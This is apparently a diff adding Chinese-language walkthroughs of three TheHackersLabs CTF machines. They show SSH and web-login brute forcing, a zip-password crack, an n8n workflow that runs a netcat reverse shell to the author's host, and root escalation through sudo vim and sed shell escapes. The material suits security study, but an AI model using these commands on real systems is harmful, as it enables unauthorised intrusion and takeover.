@@ -1367,3 +1367,588 @@ sudo /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exe
 5. **`--checkpoint-action=exec=/bin/sh`**
    - **关键部分**：在检查点触发时执行 `/bin/sh`
    - 由于以root权限运行，所以启动的是root shell
+
+## Dragon
+> **提示:** 靶机跳转传送门
+[Dragon](https://labs.thehackerslabs.com/machines/124)
+
+<img src="/assets/img/thehackerslabs-notes/dragon.png" alt="Dragon" style="zoom:50%;" />
+### 信息搜集
+
+```bash
+(base) yolo@yolo:~$ nmap -sV -Pn 10.161.159.35
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-10 18:21 CST
+Nmap scan report for 10.161.159.35
+Host is up (0.30s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.33 seconds
+```
+
+先关注下80的web端口
+
+```bash
+dirsearch -u http://10.161.159.35/
+```
+
+扫描了路径，拿到了secret/
+
+<img src="/assets/img/thehackerslabs-notes/image-20251110183323325.png" alt="image-20251110183323325" style="zoom:50%;" />
+
+```bash
+(base) yolo@yolo:~$ curl -l http://10.161.159.35/secret/
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <title>Secreto de Dragon Machine</title>
+    <style>
+        body {
+            background-color: #222;
+            color: #eee;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 2em;
+            text-align: center;
+        }
+        .riddle {
+            background-color: #333;
+            padding: 2em;
+            border-radius: 12px;
+            margin: 0 auto;
+            max-width: 600px;
+            box-shadow: 0 0 10px #f38ba8;
+        }
+    </style>
+</head>
+<body>
+    <div class="riddle">
+        <h1>Para Dragon:</h1>
+        <p>“En la sombra de la cueva, un guardián vigila sin ver,<br>
+        Su nombre es la clave, su fuerza, un misterio por resolver.<br>
+        Intenta sin pausa, las llaves del dragón,<br>
+        Y hallarás el secreto que abre la prisión.”</p>
+    </div>
+</body>
+</html>
+```
+
+观察到这里有个`<h1>Para Dragon:</h1>`,感觉可以考虑dragon就是用户名了，然后打靶机中，如果拿到了用户名的话，很显然就和ssh远程连接有点关系了，有个猜想，这里应该是ssh弱密码爆破登录
+
+### get shell
+
+```bash
+(base) yolo@yolo:~$ nano name.txt
+(base) yolo@yolo:~$ cat name.txt
+dragon
+root
+(base) yolo@yolo:~$ hydra -L name.txt -P /snap/seclists/rockyou.txt ssh://10.161.159.35 -V -I -e nsr
+```
+
+我这里假设root密码也是弱密码，看样子没跑出来，就跑出来了一个dragon用户的
+
+<img src="/assets/img/thehackerslabs-notes/image-20251110183757773.png" alt="image-20251110183757773" style="zoom:50%;" />
+
+直接连上，提权很ez
+
+```bash
+(base) yolo@yolo:~$ ssh dragon@10.161.159.35
+The authenticity of host '10.161.159.35 (10.161.159.35)' can't be established.
+ED25519 key fingerprint is SHA256:BffrSAW4tUB+TWrywXkSWeUxLcFSs0YSko5us+xdXQo.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.161.159.35' (ED25519) to the list of known hosts.
+dragon@10.161.159.35's password:
+Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-71-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of mar 05 ago 2025 08:13:17 UTC
+
+  System load:  0.84               Processes:               105
+  Usage of /:   40.7% of 11.21GB   Users logged in:         0
+  Memory usage: 9%                 IPv4 address for enp0s3: 192.168.18.184
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+El mantenimiento de seguridad expandido para Applications está desactivado
+
+Se pueden aplicar 80 actualizaciones de forma inmediata.
+Para ver estas actualizaciones adicionales, ejecute: apt list --upgradable
+
+Active ESM Apps para recibir futuras actualizaciones de seguridad adicionales.
+Vea https://ubuntu.com/esm o ejecute «sudo pro status»
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Tue Aug  5 08:13:55 2025 from 192.168.18.16
+dragon@TheHackersLabs-Dragon:~$ ls -la
+total 40
+drwxr-x--- 5 dragon dragon 4096 ago  3 01:05 .
+drwxr-xr-x 3 root   root   4096 jul 31 20:39 ..
+-rw------- 1 dragon dragon 2943 ago  5 08:22 .bash_history
+-rw-r--r-- 1 dragon dragon  220 mar 31  2024 .bash_logout
+-rw-r--r-- 1 dragon dragon 3771 mar 31  2024 .bashrc
+drwx------ 2 dragon dragon 4096 jul 31 20:44 .cache
+drwxrwxr-x 3 dragon dragon 4096 jul 31 20:58 .local
+-rw-r--r-- 1 dragon dragon  807 mar 31  2024 .profile
+drwx------ 2 dragon dragon 4096 jul 31 20:40 .ssh
+-rw-r--r-- 1 dragon dragon    0 ago  1 01:04 .sudo_as_admin_successful
+-rw-r--r-- 1 root   root     33 ago  1 01:04 user.txt
+dragon@TheHackersLabs-Dragon:~$ cat user.txt
+e1f9c2e8a1d8477f9b3f6cd298??????
+dragon@TheHackersLabs-Dragon:~$ sudo -l
+Matching Defaults entries for dragon on TheHackersLabs-Dragon:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User dragon may run the following commands on TheHackersLabs-Dragon:
+    (ALL) NOPASSWD: /usr/bin/vim
+dragon@TheHackersLabs-Dragon:~$ sudo /usr/bin/vim -c ':!/bin/sh'
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd
+# ls -la
+total 44
+drwx------  4 root root 4096 ago  5 08:22 .
+drwxr-xr-x 23 root root 4096 jul 31 20:21 ..
+-rw-------  1 root root 2592 ago  5 08:22 .bash_history
+-rw-r--r--  1 root root 3106 abr 22  2024 .bashrc
+-rw-r--r--  1 root root  560 ago  4 13:33 congrats.txt
+-rw-------  1 root root   33 ago  1 01:17 .lesshst
+drwxr-xr-x  3 root root 4096 jul 31 21:04 .local
+-rw-r--r--  1 root root  161 abr 22  2024 .profile
+-rw-------  1 root root   33 ago  1 01:10 root.txt
+drwx------  2 root root 4096 jul 31 20:39 .ssh
+-rw-------  1 root root  743 ago  5 08:22 .viminfo
+# cat root.txt
+7a4d1b35eebf4aefa5f1b0198b??????
+
+```
+
+### 解析提权payload
+
+```bash
+   -c <command>         Execute <command> after loading the first file
+```
+
+使用vim -h能看到这一条功能，意思是说加载一个文件后会立刻执行命令，然后我举个例子，这里就用上面生成的name.txt举例
+
+<img src="/assets/img/thehackerslabs-notes/image-20251110185140318.png" alt="image-20251110185140318" style="zoom:50%;" />
+
+输入`:!/bin/sh`会直接进入当前用户的shell
+
+<img src="/assets/img/thehackerslabs-notes/image-20251110185041887.png" alt="image-20251110185041887" style="zoom:50%;" />
+
+> ps:在vim中，要是想执行外部命令，**!**绝对不能丢
+{: .prompt-warning }
+
+然后呢，我的这个payload `sudo /usr/bin/vim -c ':!/bin/sh'`没有指定文件名也没问题，因为vim会默认打开一个空白的新文件
+
+## NodeCeption
+> **提示:** 靶机跳转传送门
+[DodeCeption](https://labs.thehackerslabs.com/machines/118)
+
+<img src="/assets/img/thehackerslabs-notes/NodeCeption.png" alt="NodeCeption" style="zoom:50%;" />
+
+### 信息搜集
+
+扫描完端口，发现三个存活端口
+
+```bash
+❯ nmap -sV -Pn -p 1-65535 10.161.159.139
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-10 20:32 CST
+Nmap scan report for 10.161.159.139
+Host is up (0.0017s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
+5678/tcp open  rrac?
+8765/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port5678-TCP:V=7.94SVN%I=7%D=11/10%Time=6911DE73%P=x86_64-pc-linux-gnu%
+SF:r(GetRequest,8DC,"HTTP/1\.1\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\n
+SF:Cache-Control:\x20public,\x20max-age=86400\r\nLast-Modified:\x20Mon,\x2
+SF:010\x20Nov\x202025\x2011:37:06\x20GMT\r\nETag:\x20W/\"7b7-19a6d8e3176\"
+SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
+SF:1975\r\nVary:\x20Accept-Encoding\r\nDate:\x20Mon,\x2010\x20Nov\x202025\
+SF:x2012:45:37\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<
+SF:html\x20lang=\"en\">\n\t<head>\n\t\t<script\x20type=\"module\"\x20cross
+SF:origin\x20src=\"/assets/polyfills-B8p9DdqU\.js\"></script>\n\n\t\t<meta
+SF:\x20charset=\"utf-8\"\x20/>\n\t\t<meta\x20http-equiv=\"X-UA-Compatible\
+SF:"\x20content=\"IE=edge\"\x20/>\n\t\t<meta\x20name=\"viewport\"\x20conte
+SF:nt=\"width=device-width,initial-scale=1\.0\"\x20/>\n\t\t<link\x20rel=\"
+SF:icon\"\x20href=\"/favicon\.ico\"\x20/>\n\t\t<style>@media\x20\(prefers-
+SF:color-scheme:\x20dark\)\x20{\x20body\x20{\x20background-color:\x20rgb\(
+SF:45,\x2046,\x2046\)\x20}\x20}</style>\n\t\t<script\x20type=\"text/javasc
+SF:ript\">\n\t\t\twindow\.BASE_PATH\x20=\x20'/';\n\t\t\twindow\.REST_ENDPO
+SF:INT\x20=\x20'rest';\n\t\t</script>\n\t\t<script\x20src=\"/rest/sentry\.
+SF:js\"></script>\n\t\t<script>!function\(t,e\){var\x20o,n,")%r(HTTPOption
+SF:s,183,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20
+SF:default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-
+SF:Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nVary:
+SF:\x20Accept-Encoding\r\nDate:\x20Mon,\x2010\x20Nov\x202025\x2012:45:37\x
+SF:20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=
+SF:\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</h
+SF:ead>\n<body>\n<pre>Cannot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r
+SF:(RTSPRequest,183,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-
+SF:Policy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\
+SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201
+SF:43\r\nVary:\x20Accept-Encoding\r\nDate:\x20Mon,\x2010\x20Nov\x202025\x2
+SF:012:45:37\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<ht
+SF:ml\x20lang=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</
+SF:title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x20/</pre>\n</body>\n</
+SF:html>\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 773.81 seconds
+```
+
+看上去5678端口是个n8n面板web服务
+
+因为是个登录服务，不太想先碰，看看另一个web服务
+
+乍一看，是个apache的安装成功页面
+
+查看源代码，拿到了关键信息
+
+<img src="/assets/img/thehackerslabs-notes/image-20251110205622293.png" alt="image-20251110205622293" style="zoom:50%;" />
+
+翻译了下，这里就给出了登录邮箱，然后密码的话，说是有至少8位密码，然后有大写有数字，老外这脑回路真抽象啊，我就这样把rockyou过滤了一下
+
+```bash
+cat /snap/seclists/rockyou.txt | grep -P '(?=.*\d)(?=.*[A-Z])(?=.*[a-z])' > pass.txt
+```
+
+大致意思是说把匹配只有数字和英文字母的密码给提取出来了
+
+然后我用burp爆破，发现爆破出来了一个合适的密码，omg，这神奇的脑回路
+
+<img src="/assets/img/thehackerslabs-notes/image-20251110211239085.png" alt="image-20251110211239085" style="zoom: 50%;" />
+
+对了，上面补充一个信息，就是我对apache这个web进行路径扫描，也扫描到了login.php呢，然后上面密码爆破的poc就是爆破的8765这个端口的login.php
+
+<img src="/assets/img/thehackerslabs-notes/image-20251110211546750.png" alt="image-20251110211546750" style="zoom:50%;" />
+
+666,这题好抽象
+
+### get shell
+
+直接创建个工作流，在Core下面直接选择执行命令行
+
+<img src="/assets/img/thehackerslabs-notes/image-20251110212334723.png" alt="image-20251110212334723" style="zoom:50%;" />
+
+```bash
+busybox nc 10.161.149.243 4444 -e bash 
+```
+
+<img src="/assets/img/thehackerslabs-notes/image-20251110221542116.png" alt="image-20251110221542116" style="zoom:50%;" />
+
+然后我的kali端监听到了，接下来就是稳定shell阶段
+
+```bash
+/usr/bin/script -qc /bin/bash /dev/null
+^z
+stty raw -echo;fg
+reset
+xterm
+```
+
+真的很纳闷呢，明明写了可以无密码执行vi，结果当前用户必须写密码执行
+
+```bash
+thl@nodeception:~$ ls -la
+total 52
+drwxr-x--- 8 thl  thl  4096 nov 10 14:05 .
+drwxr-xr-x 3 root root 4096 jul  6 10:20 ..
+lrwxrwxrwx 1 root root    9 jul  7 12:40 .bash_history -> /dev/null
+-rw-r--r-- 1 thl  thl   220 mar 31  2024 .bash_logout
+-rw-r--r-- 1 thl  thl  3968 jul 18 11:12 .bashrc
+drwx------ 4 thl  thl  4096 jul 18 11:13 .cache
+drwxrwxr-x 3 thl  thl  4096 jul  6 13:29 .local
+drwxrwxr-x 6 thl  thl  4096 nov 10 13:58 .n8n
+drwxrwxr-x 5 thl  thl  4096 jul 18 11:13 .npm
+drwxrwxr-x 8 thl  thl  4096 jul 18 11:12 .nvm
+-rw-r--r-- 1 thl  thl   807 mar 31  2024 .profile
+drwx------ 2 thl  thl  4096 jul  6 10:20 .ssh
+-rw-r--r-- 1 thl  thl     0 jul  6 10:22 .sudo_as_admin_successful
+-rw-r--r-- 1 root thl    27 jul  7 12:38 user.txt
+-rw------- 1 thl  thl  1570 nov 10 14:05 .viminfo
+thl@nodeception:~$ cat user.txt
+THL_wdYkVpXlqNaEUhRJ??????
+thl@nodeception:~$ sudo -l
+Matching Defaults entries for thl on nodeception:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User thl may run the following commands on nodeception:
+    (ALL) NOPASSWD: /usr/bin/vi
+    (ALL : ALL) ALL
+```
+
+这绝对是个bug，最后只能爆破下密码了
+
+<img src="/assets/img/thehackerslabs-notes/image-20251110221853057.png" alt="image-20251110221853057" style="zoom:50%;" />
+
+```bash
+thl@nodeception:~$ sudo su
+[sudo] password for thl: 
+root@nodeception:/home/thl# id
+uid=0(root) gid=0(root) groups=0(root)
+root@nodeception:/home/thl# cd && cat root.txt
+THL_QzXeoMuYRcJtWHabn??????
+```
+## Sedition
+> **提示:** 靶机跳转传送门
+[Sedition](https://labs.thehackerslabs.com/machines/117)
+
+<img src="/assets/img/thehackerslabs-notes/Sedition.png" alt="Sedition" style="zoom:50%;" />
+
+### 信息搜集
+
+```bash
+❯ nmap -p- --min-rate 5000 10.161.161.139
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-10 23:10 CST
+Nmap scan report for 10.161.161.139
+Host is up (0.00064s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+65535/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 15.04 seconds
+❯ nmap -sCV -p 65535 10.161.161.139
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-10 23:11 CST
+Nmap scan report for 10.161.161.139
+Host is up (0.00059s latency).
+
+PORT      STATE SERVICE VERSION
+65535/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
+| ssh-hostkey:
+|   256 32:ca:e5:d1:12:c2:1e:11:1e:58:43:32:a0:dc:03:ab (ECDSA)
+|_  256 79:3a:80:50:61:d9:96:34:e2:db:d6:1e:65:f0:a9:14 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.63 seconds
+```
+
+一开始爆破，发现就两个smb服务，这样的话，我可远程连不上，就全部爆破了下，发现65535开放，是我要的ssh服务
+
+在smb服务中呢，我匿名拿到了一个压缩包
+
+```bash
+❯ smbclient -L //10.161.161.139 -N
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        backup          Disk
+        IPC$            IPC       IPC Service (Samba Server)
+        nobody          Disk      Home Directories
+SMB1 disabled -- no workgroup available
+❯ smbclient //10.161.161.139/backup -N
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Jul  7 01:02:53 2025
+  ..                                  D        0  Mon Jul  7 02:15:13 2025
+  secretito.zip                       N      216  Mon Jul  7 01:02:31 2025
+
+                19480400 blocks of size 1024. 16245492 blocks available
+smb: \> get secretito.zip
+getting file \secretito.zip of size 216 as secretito.zip (19.2 KiloBytes/sec) (average 19.2 KiloBytes/sec)
+smb: \> q
+```
+
+但是呢，我发现压缩包是加密过的，那就用john爆破处理了
+
+```bash
+❯ bkcrack -L secretito.zip
+bkcrack 1.8.0 - 2025-08-18
+Archive: secretito.zip
+Index Encryption Compression CRC32    Uncompressed  Packed size Name
+----- ---------- ----------- -------- ------------ ------------ ----------------
+    0 ZipCrypto  Store       f2e5967a           22           34 password
+❯ zip2john secretito.zip > ziphash
+ver 1.0 efh 5455 efh 7875 secretito.zip/password PKZIP Encr: 2b chk, TS_chk, cmplen=34, decmplen=22, crc=F2E5967A ts=969D cs=969d type=0
+Note: It is normal for some outputs to be very large
+❯ john ziphash --wordlist=/snap/seclists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Cracked 1 password hash (is in /home/yolo/Desktop/tools/john/run/john.pot), use "--show"
+No password hashes left to crack (see FAQ)
+❯ john ziphash --show
+secretito.zip/password:sebastian:password:secretito.zip::secretito.zip
+
+1 password hash cracked, 0 left
+```
+
+这里是因为我之前爆破过，已经结果出来了，拿到压缩包密码`sebastian`
+
+解压后拿到密码`elbunkermolagollon123`
+
+下面操作中由于宿舍网断了，连热点的话，靶机IP会变，凑活看吧
+
+### get shell
+
+```bash
+❯ rpcclient -N -U ""  192.168.233.191
+rpcclient $> enumdomusers
+user:[cowboy] rid:[0x3e8]
+rpcclient $>
+```
+
+会发现，靶机有用户cowboy，结合上面的那个密码，完全可以ssh连接上去
+
+```bash
+cowboy@Sedition:~$ ls -la
+total 116
+drwx------ 2 cowboy cowboy  4096 nov 10 16:30 .
+drwxr-xr-x 4 root   root    4096 jul  6 18:56 ..
+-rw------- 1 cowboy cowboy   350 nov 10 16:40 .bash_history
+-rw-r--r-- 1 cowboy cowboy   220 jul  6 18:56 .bash_logout
+-rw-r--r-- 1 cowboy cowboy  3526 jul  6 18:56 .bashrc
+-rw------- 1 cowboy cowboy    20 nov 10 16:19 .lesshst
+-rw------- 1 cowboy cowboy    98 nov 10 16:30 .mysql_history
+-rw-r--r-- 1 cowboy cowboy   807 jul  6 18:56 .profile
+cowboy@Sedition:~$ ls ../
+cowboy  debian
+cowboy@Sedition:~$ ls ../debian
+ls: no se puede abrir el directorio '../debian': Permiso denegado
+```
+
+显然要水平渗透，拿到debian用户的shell，先看看.bash_history
+
+```bash
+cowboy@Sedition:~$ cat .bash_history
+history
+exit
+mariadb
+mariadb -u cowboy -pelbunkermolagollon123
+su debian
+```
+
+这里有个数据库连接操作，进去后，可以拿到debian用户密码的md5哈希值
+
+```bash
+cowboy@Sedition:~$ mariadb -u cowboy -pelbunkermolagollon123
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 31
+Server version: 10.11.11-MariaDB-0+deb12u1 Debian 12
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| bunker             |
+| information_schema |
++--------------------+
+2 rows in set (0,112 sec)
+
+MariaDB [(none)]> use bunker;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [bunker]> SHOW TABLES;
++------------------+
+| Tables_in_bunker |
++------------------+
+| users            |
++------------------+
+1 row in set (0,000 sec)
+
+MariaDB [bunker]> SELECT * FROM users;
++--------+----------------------------------+
+| user   | password                         |
++--------+----------------------------------+
+| debian | 7c6a180b36896a0a8c02787eeafb0e4c |
++--------+----------------------------------+
+1 row in set (0,022 sec)
+
+MariaDB [bunker]> ^DBye
+```
+
+拿到密码
+
+<img src="/assets/img/thehackerslabs-notes/image-20251110234636466.png" alt="image-20251110234636466" style="zoom:50%;" />
+
+然后get user flag
+
+```bash
+cowboy@Sedition:~$ su debian
+Contraseña: 
+debian@Sedition:/home/cowboy$ ls -la
+ls: no se puede abrir el directorio '.': Permiso denegado
+debian@Sedition:/home/cowboy$ cd
+debian@Sedition:~$ ls -la
+total 36
+drwx-----x 4 debian debian  4096 jul  6 20:15 .
+drwxr-xr-x 4 root   root    4096 jul  6 18:56 ..
+drwxr-xr-x 2 nobody nogroup 4096 jul  6 19:02 backup
+-rw------- 1 debian debian   755 nov 10 16:40 .bash_history
+-rw-r--r-- 1 debian debian   220 jul  6 11:07 .bash_logout
+-rw-r--r-- 1 debian debian  3526 jul  6 11:07 .bashrc
+-rw-r--r-- 1 debian debian    21 jul  6 20:15 flag.txt
+drwxr-xr-x 3 debian debian  4096 jul  6 18:52 .local
+-rw-r--r-- 1 debian debian   807 jul  6 11:07 .profile
+debian@Sedition:~$ cat flag.txt
+pinguinitoping??????
+```
+
+### to root
+
+```bash
+debian@Sedition:~$ sudo -l
+Matching Defaults entries for debian on sedition:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User debian may run the following commands on sedition:
+    (ALL) NOPASSWD: /usr/bin/sed
+```
+
+发现可以用sed来进行sudo无密码提权
+
+```bash
+debian@Sedition:~$ sudo sed -n '1e exec sh 1>&0' /etc/hosts
+# id
+uid=0(root) gid=0(root) grupos=0(root)
+# cd
+# cat root.txt
+laflagdelbunkerderootmola??????
+```
+
+> payload解析
+
+`sudo sed -n '1e exec sh 1>&0'`
+
+- `sed -n` 安静模式，不自动打印模式空间的内容
+- 正常情况下sed会处理输入并输出对应内容，但是-n可以让它只执行命令不输出
+
+- `'1e exec sh 1>&0'`
+- - 1：匹配第一行
+  - e：sed的执行命令，执行后面的shell命令
+  - exec sh：用sh进程替换当前sed进程
+  - 1>&0：将标准输出重定向到标准输入，确保shell的I/O能正常工作
+
